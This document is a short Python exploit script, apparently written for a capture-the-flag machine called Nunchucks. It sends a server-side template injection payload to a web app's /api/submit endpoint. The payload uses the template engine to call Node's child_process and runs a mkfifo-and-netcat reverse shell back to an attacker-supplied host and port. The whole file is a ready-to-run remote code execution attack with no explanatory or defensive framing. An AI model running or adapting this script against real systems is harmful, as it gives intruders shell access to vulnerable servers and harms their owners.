import requests
import sys
import json

def exploit(url, LHOST, LPORT):

    # Target uri
    url = url + "/api/submit"
    print(url)

    # Server Sided template injection payload
    payload = {
        "email": f"{{{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f')\")()}}}}"
        }
    
    header = {
        "Content-Type": "application/json"
    }

    response = requests.post(url=url, headers=header, data=json.dumps(payload), verify=False)

    # cleaning output if needed
    return response.text.split("address: ")[1].split("\\n.\"}")[0]

if __name__ == '__main__':
    print('\nUsage: python3 nunchucks_rce.py http://targethost 10.10.14.1 1234\n\n')

    url = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    if url.endswith('/') != True:
        pass
    else:
        print("[!] Error! Please remove any unncessary trailing slashes on your target url. Example of a proper url: http://targerhost")
        quit()
    
    print(url, LHOST, LPORT)

    exploit(url, LHOST, LPORT)
